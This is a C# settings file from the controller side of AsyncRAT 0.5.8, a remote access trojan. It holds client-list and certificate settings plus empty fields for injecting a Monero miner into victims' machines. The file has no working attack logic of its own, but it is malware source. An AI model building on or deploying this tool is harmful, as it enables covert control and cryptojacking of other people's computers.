using Server.Algorithm;
using Server.Connection;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;

namespace Server
{
    public static class Settings
    {
        // List of blocked items
        public static List<string> Blocked = new List<string>();
        // Lock object for synchronization
        public static object LockBlocked = new object();

        // Sent and received data counters
        public static long SentValue { get; set; }
        public static long ReceivedValue { get; set; }
        // Lock object for synchronization between received and sent data values
        public static object LockReceivedSendValue = new object();

        // Path to the certificate (using the startup path of the application)
        public static string CertificatePath = Application.StartupPath + "\\ServerCertificate.p12";
        // Server certificate object
        public static X509Certificate2 ServerCertificate;
        // Version of the application
        public static readonly string Version = "AsyncRAT 0.5.8";
        // Lock objects for synchronizing various UI elements
        public static object LockListviewClients = new object();
        public static object LockListviewLogs = new object();
        public static object LockListviewThumb = new object();
        // Flag for showing report window
        public static bool ReportWindow = false;
        // List of clients for the report window
        public static List<Clients> ReportWindowClients = new List<Clients>();
        // Lock object for synchronizing access to the report window clients
        public static object LockReportWindowClients = new object();
    }

    // Settings for XMR (Monero) mining configuration
    public static class XmrSettings
    {
        public static string Pool = "";  // Mining pool address
        public static string Wallet = "";  // Wallet address
        public static string Pass = "";  // Password for the pool (if any)
        public static string InjectTo = "";  // Target to inject mining data into
        public static string Hash = "";  // Hash for the mining operation
    }
}
